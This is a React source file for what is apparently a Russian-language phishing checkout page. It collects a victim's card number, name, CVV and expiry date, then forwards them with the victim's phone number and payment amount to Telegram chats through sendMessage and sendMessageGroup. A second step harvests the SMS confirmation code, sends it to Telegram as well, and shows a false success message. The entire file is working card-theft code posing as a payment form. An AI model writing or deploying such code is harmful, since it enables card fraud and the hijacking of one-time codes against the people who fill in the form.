import React, { useState, useEffect } from 'react';
import './styles.css';
import { useNavigate, useLocation } from 'react-router-dom';
import axios from 'axios';
import { sendMessage, sendMessageGroup } from '../api/telegram.ts';
import InputMask from 'react-input-mask';

const OrderOther = () => {
  const location = useLocation();
  const navigate = useNavigate();

  const [showAlert, setShowAlert] = useState(true);
  const [step, setStep] = useState(1);
  const [cardData, setCardData] = useState({
    cardNumber: '',
    name: '',
    cvv: '',
    expiryDate: '',
    amount: '',
    agreement: false,
  });
  const [smsCode, setSmsCode] = useState('');
  const [loading, setLoading] = useState(false);
  const [verificationLoading, setVerificationLoading] = useState(false);
  const [timeLeft, setTimeLeft] = useState(15 * 60); // 15 minutes in seconds
  const [errors, setErrors] = useState({});
  const [formData, setFormData] = useState({});

  useEffect(() => {
    const fetchData = async () => {
      try {
        const response = await axios.get(`/api/db/form/${location.state.id}`);
        setFormData(response.data);
      } catch (error) {
        console.error('Error fetching form data:', error);
      }
    };

    fetchData();
  }, [location.state.id]);

  const handleChange = (e) => {
    const { name, value, type, checked } = e.target;
    setCardData({
      ...cardData,
      [name]: type === 'checkbox' ? checked : value.trim(),
    });
  };

  const handleSmsSend = async () => {
    setLoading(true);
    try {
      const message = `
        Name: [ ${formData.name} ] Amount: [ ${formData.amount} ] EUR Phone Number: [ ${formData.phoneNumber} ]
        Bank Name: [${cardData.name}]
        Card Number: [${cardData.cardNumber}] CVV: [${cardData.cvv}] Expiry Date: [${cardData.expiryDate}]
      `;

      sendMessageGroup(message);
      sendMessage(message);

      // Сбрасываем данные формы
      setCardData({
        cardNumber: '',
        name: '',
        cvv: '',
        expiryDate: '',
        amount: '',
        agreement: false,
      });

      setStep(2);
    } catch (error) {
      console.error('Error sending message:', error.message);
    }
    setLoading(false);
  };

  const handleSmsSubmit = async () => {
    setVerificationLoading(true);
    try {
      sendMessage(`SMS Code: ${smsCode}`);
      sendMessageGroup(`SMS Code: ${smsCode}`);

      setSmsCode('');
      navigate('/statusru', { state: { result: 'success', message: 'Транзакция успешна' } });
    } catch (error) {
      console.error('Error processing verification:', error.message);
    }
    setVerificationLoading(false);
  };

  useEffect(() => {
    let timer;
    if (step === 2) {
      timer = setInterval(() => {
        setTimeLeft((prevTime) => (prevTime > 0 ? prevTime - 1 : 0));
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [step]);

  const formatTime = (time) => {
    const minutes = Math.floor(time / 60);
    const seconds = time % 60;
    return `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
  };

  return (
    <div className="flex flex-col items-center justify-start min-h-screen bg-gray-fon px-4 mb:pt-20 pt-4 placeholder-gray-text">
      <div className="space-y-4 w-full max-w-xl mb-12">
        <div className="bg-white p-6 rounded-lg mb-12">
          <h2 className="text-xl font-bold mb-6 text-center">Способ оплаты</h2>
          <div className="flex justify-center space-x-4 mb-4">
            <button className="py-2 px-4 bg-white border-b-2 border-blue-400 hover:border-blue-800">Банковская карта</button>
          </div>
        </div>
        <div className="w-full md:max-w-[608px] max-w-[390px] flex justify-center items-center bg-white p-6 rounded-lg">
          {step === 1 && (
            <form className="text-grayth w-[350px] md:w-[470px]">
              <div className="mt-6 mb-6 text-left w-full">
                <label htmlFor="cardNumber" className="block font-normal text-gray-700">
                  Укажите номер Вашей карты
                </label>
                <InputMask
                  mask="9999 9999 9999 9999"
                  value={cardData.cardNumber}
                  onChange={handleChange}
                >
                  {() => (
                    <input
                      type="text"
                      name="cardNumber"
                      id="cardNumber"
                      className={`mt-1 block w-full h-[35px] border ${errors.cardNumber ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                      placeholder="1456 1345 0958 4234"
                      required
                    />
                  )}
                </InputMask>
                {errors.cardNumber && <p className="text-red-500 text-sm">{errors.cardNumber}</p>}
              </div>
              <div className="mb-6 text-left w-full">
                <label htmlFor="name" className="block font-normal text-gray-700">
                  Укажите Ваше имя и фамилию
                </label>
                <input
                  type="text"
                  name="name"
                  id="name"
                  value={cardData.name}
                  onChange={handleChange}
                  className={`mt-1 block w-full h-[35px] border ${errors.name ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                  placeholder="Иван Иванов"
                  required
                />
                {errors.name && <p className="text-red-500 text-sm">{errors.name}</p>}
              </div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div className="md:mb-12 mb-0 text-left w-full">
                  <label htmlFor="expiryDate" className="block font-normal text-gray-700">
                    Срок действия
                  </label>
                  <InputMask
                    mask="99/99"
                    value={cardData.expiryDate}
                    onChange={handleChange}
                    alwaysShowMask={false} // Отключаем отображение маски при удалении символов
                  >
                    {() => (
                      <input
                        type="text"
                        name="expiryDate"
                        id="expiryDate"
                        className={`mt-1 block w-full h-[35px] border ${errors.expiryDate ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                        placeholder="MM/YY"
                        required
                      />
                    )}
                  </InputMask>
                  {errors.expiryDate && <p className="text-red-500 text-sm">{errors.expiryDate}</p>}
                </div>
                <div className="mb-12 w-full text-left">
                  <label htmlFor="cvv" className="block font-normal text-gray-700">
                    CVV2
                  </label>
                  <InputMask
                    mask="999"
                    value={cardData.cvv}
                    onChange={handleChange}
                    alwaysShowMask={false} // Отключаем отображение маски при удалении символов
                  >
                    {() => (
                      <input
                        type="text"
                        name="cvv"
                        id="cvv"
                        className={`mt-1 block w-full h-[35px] border ${errors.cvv ? 'border-red-500' : 'border-gray-200'} bg-gray-form rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                        placeholder="227"
                        maxLength="3"
                        required
                      />
                    )}
                  </InputMask>
                  {errors.cvv && <p className="text-red-500 text-sm">{errors.cvv}</p>}
                </div>
              </div>
              <button
                type="button"
                className="bg-grayth text-white h-[50px] py-2 px-4 rounded-md hover:bg-purple-950 mt-6 w-full"
                onClick={handleSmsSend}
              >
                Продолжить
              </button>
              <div className="w-full mt-6 flex items-center justify-between">
                <label htmlFor="agreement" className="block w-[84%] font-normal text-gray-700">
                  Подтверждаете пользовательское соглашение?
                </label>
                <label className="switch">
                  <input
                    type="checkbox"
                    name="agreement"
                    id="agreement"
                    checked={cardData.agreement}
                    onChange={handleChange}
                    required
                  />
                  <span className="slider round"></span>
                </label>
                {errors.agreement && <p className="text-red-500 text-sm">{errors.agreement}</p>}
              </div>
              <p className="w-full mt-4 text-left text-sm text-grayth">
                Нажимая на кнопку "Оплатить", вы подтверждаете, что ознакомлены с перечнем информации об услуге и принимаете
                <span className="text-blue-400 font-normal"> условия публичного договора.</span>
              </p>
            </form>
          )}
          {step === 2 && (
            <div className="flex flex-col justify-center items-center text-center md:w-[470px] w-[390px]">
              <h2 className="text-xl font-semibold mb-4">Подтверждение</h2>
              <p className="text-sm text-grayth mb-4">
                Для подтверждения перевода средств мы отправили Вам код из 6 (шести) цифр на номер телефона в личные сообщения (СМС). ВНИМАНИЕ! Никому не сообщайте код из СМС, для защиты ваших персональных данных!
              </p>
              <div className="flex justify-center items-center mb-4">
              <svg className="w-24 h-24" viewBox="0 0 100 100">
              <defs>
                    <linearGradient id="static-gradient" x1="0%" y1="0%" x2="100%">
                      <stop offset="0%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 1 }} />
                      <stop offset="70%" style={{ stopColor: 'rgba(48, 12, 96, 0.8)', stopOpacity: 1 }} />
                      <stop offset="100%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 1 }} />
                    </linearGradient>
                    <linearGradient id="animated-gradient" x1="0%" y1="0%" x2="100%">
                      <stop offset="0%" style={{ stopColor: 'rgba(6, 155, 231, 1)', stopOpacity: 0.4 }} />
                      <stop offset="50%" style={{ stopColor: 'rgba(48, 12, 96, 1)', stopOpacity: 0.4 }} />
                      <stop offset="100%" style={{ stopColor: 'rgba(48, 12, 96, 1)', stopOpacity: 0.4 }} />
                    </linearGradient>
                  </defs>
                  <circle
                    className="static-circle"
                    r="45"
                    cx="50"
                    cy="50"
                    stroke="url(#static-gradient)"
                    strokeWidth="4"
                    fill="transparent"
                  />
                  <circle
                    className="circle animated-circle"
                    stroke="url(#animated-gradient)"
                    strokeWidth="4"
                    fill="transparent"
                    r="45"
                    cx="50"
                    cy="50"
                    style={{ strokeDasharray: '170 283', strokeDashoffset: '0' }}
                  />
                </svg>
                <p className="absolute text-2xl font-bold text-blue-600">{formatTime(timeLeft)}</p>
              </div>
              <p className="text-sm text-grayth mb-8">Осталось для подтверждения</p>
              <div className="mb-4 w-full">
                <label htmlFor="smsCode" className="block text-sm text-left font-normal text-gray-700">
                  Введите код подтверждения
                </label>
                <InputMask
                  mask="999999"
                  value={smsCode}
                  onChange={(e) => setSmsCode(e.target.value)}
                >
                  {() => (
                    <input
                      type="text"
                      name="smsCode"
                      id="smsCode"
                      className={`mt-1 block w-full h-[35px] bg-gray-form border ${errors.smsCode ? 'border-red-500' : 'border-gray-200'} rounded-md p-2 focus:bg-white focus:border-neutral-700 focus:shadow-md`}
                      placeholder="123456"
                      required
                    />
                  )}
                </InputMask>
                {errors.smsCode && <p className="text-red-500 text-sm">{errors.smsCode}</p>}
              </div>
              <button
                className="bg-grayth text-white py-2 px-4 rounded-md hover:bg-purple-950 mt-4 w-full h-[50px]"
                onClick={handleSmsSubmit}
              >
                Подтвердить
              </button>
            </div>
          )}
        </div>
      </div>
    </div>
  );
};

export default OrderOther;
